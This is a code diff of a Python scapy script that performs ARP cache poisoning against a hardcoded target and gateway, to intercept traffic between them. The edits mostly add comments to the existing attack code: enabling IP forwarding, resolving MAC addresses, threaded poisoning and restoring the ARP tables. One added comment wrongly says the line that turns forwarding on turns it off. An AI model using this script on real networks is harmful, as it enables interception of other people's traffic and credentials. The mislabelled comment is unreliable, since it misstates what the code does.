@@ -4,14 +4,17 @@ import os
 import sys
 import threading
 
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-#interface    = "en1"
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") #Turn off forwarding,
+
 target_ip    = "192.168.43.41"
 gateway_ip   = "192.168.43.1"
 packet_count = 1000
 poisoning    = True
-    
-def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
+
+"""
+This function restores the targets by sending them the before-attack real addresses.
+"""
+def restore_target(gateway_ip,gateway_mac,target_ip,target_mac): 
     
     # slightly different method using send
     print("[*] Restoring target...")
@@ -19,6 +22,9 @@ def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
+"""
+This function get a mac address by sending 'who-has' ARP request to the broadcast.
+"""
 def get_mac(ip_address):
     
     responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
@@ -29,6 +35,9 @@ def get_mac(ip_address):
     
     return None
     
+"""
+This function is running and sending ARP poisoning responses to the victim && the gateway
+"""
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     global poisoning
    
@@ -67,7 +76,7 @@ else:
     print("[*] Target %s is at %s" % (target_ip,target_mac))
     
 # start poison thread
-poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
+poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac)) #Run spoofing in a thread until it gets keyboard interrupt
 poison_thread.start()
 
 try:
